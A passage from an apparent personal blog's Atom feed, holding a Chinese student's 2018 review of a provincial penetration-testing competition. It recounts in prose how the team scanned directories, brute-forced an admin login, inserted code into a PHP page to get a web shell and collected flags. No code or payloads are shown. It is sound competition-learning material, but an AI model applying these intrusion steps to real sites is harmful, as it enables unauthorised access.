&lt;p&gt;Web：需要对各种web漏洞了解，明白其形成原因和利用方式；了解计算机网络、网站搭建、会用常见的网站框架，同时需要大量的练习；&lt;/p&gt;</summary>
    
    
    
    
    <category term="总结" scheme="http://ch3cke.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>省赛总结</title>
    <link href="http://ch3cke.github.io/2018/10/30/%E7%9C%81%E8%B5%9B%E6%80%BB%E7%BB%93/"/>
    <id>http://ch3cke.github.io/2018/10/30/%E7%9C%81%E8%B5%9B%E6%80%BB%E7%BB%93/</id>
    <published>2018-10-29T16:30:32.000Z</published>
    <updated>2021-06-10T14:40:19.191Z</updated>
    
    <content type="html"><![CDATA[<h2 id="初赛"><a href="#初赛" class="headerlink" title="初赛"></a>初赛</h2><p>2018年10月20日</p><span id="more"></span><p>这次比赛作为华师代表队Check参与比赛，深深感觉自己的知识水平真的不够，题目做的太少了，还是以后要加强学习，学的太少了。题目都是web题目，web好久没做了，有点手生。比赛和CTF不同，主要是渗透测试。</p><ul><li>初赛题目四个，分别是两个内网题目，两个外网题目，外网平台分别是一个网上的APP下载平台，和一个Apache服务器。</li><li>APP下载平台利用方式</li></ul><p>1.利用目录扫描工具，扫描目录，获取到后台目录admin和robots.txt,其中robots.txt存在一个flag，提交即可。<br>2.访问后台admin页面，可以看见登录页面。（偷偷用扫描页面扫过）没有其他漏洞，猜想存在弱口令秘密，试了几个，发现不行，想到爆破。<br>3.存在有一个安全码，可能是防止爆破，但是没什么卵用，查看页面源码，页面底部就有安全码，直接输入。bp一把梭，抓包导入字典爆破。得到密码：admin123，进入后台，后台底部就有一个flag。<br>4.有小tips，这个网站可以访问PHP页面，所以没必要上传什么木马了，直接插入就行了，然后菜刀一连，getshell，在桌面找到一个flag，提交。<br>5.还有一个falg，藏得页面有点深，感谢队友的仔细搜索。hhh</p><ul><li>Apache服务器没有黑进去，有点尴尬。。。。</li></ul><p>1.说一下找到的一个flag，实在目录下的，直接访问flag.txt,运气不错！hhh初赛简单的很，哈哈哈，感谢大佬手下留情。<br>2.因为后来对Apache服务器不熟悉，一开始方向错了，经验不够，后来时间不够，实在没进去。555555</p><h2 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h2><p>2018年10月29日<br>线下赛真的菜，没办法，打的少，被虐了，呜呜呜<br>平台不熟悉,培训没去，也是坑点<br>一个获取的flag是利用ftp下载的flag，查看就行。因为人手不够没写exp，效率不够，得分少得可怜，惨兮兮。。。。</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li>要对各种平台有熟悉的了解，内网穿透什么的要有所涉及</li><li>常见的漏洞，字典平时要有点储备，爆破快速</li><li>线下赛分工一定要明确，做好自己的工作</li><li>学会写EXP，手动提交真的不够速度</li></ol><h2 id="吐槽："><a href="#吐槽：" class="headerlink" title="吐槽："></a>吐槽：</h2><p>不能联网，这点很服<br>为啥自己的服务器还要自己黑进去</p><h1 id="最后，自己太菜了，以后加油！！！"><a href="#最后，自己太菜了，以后加油！！！" class="headerlink" title="最后，自己太菜了，以后加油！！！"></a>最后，自己太菜了，以后加油！！！</h1><h1 id="好好学习"><a href="#好好学习" class="headerlink" title="好好学习"></a>好好学习</h1>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;初赛&quot;&gt;&lt;a href=&quot;#初赛&quot; class=&quot;headerlink&quot; title=&quot;初赛&quot;&gt;&lt;/a&gt;初赛&lt;/h2&gt;&lt;p&gt;2018年10月20日&lt;/p&gt;
&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;
&lt;p&gt;这次比赛作为华师代表队Check参与比赛，深深感觉自己的知识水平真的不够，题目做的太少了，还是以后要加强学习，学的太少了。题目都是web题目，web好久没做了，有点手生。比赛和CTF不同，主要是渗透测试。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;初赛题目四个，分别是两个内网题目，两个外网题目，外网平台分别是一个网上的APP下载平台，和一个Apache服务器。&lt;/li&gt;
&lt;li&gt;APP下载平台利用方式&lt;/li&gt;
&lt;/ul&gt;</summary>
    
    
    
    <category term="总结" scheme="http://ch3cke.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="http://ch3cke.github.io/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
</feed>
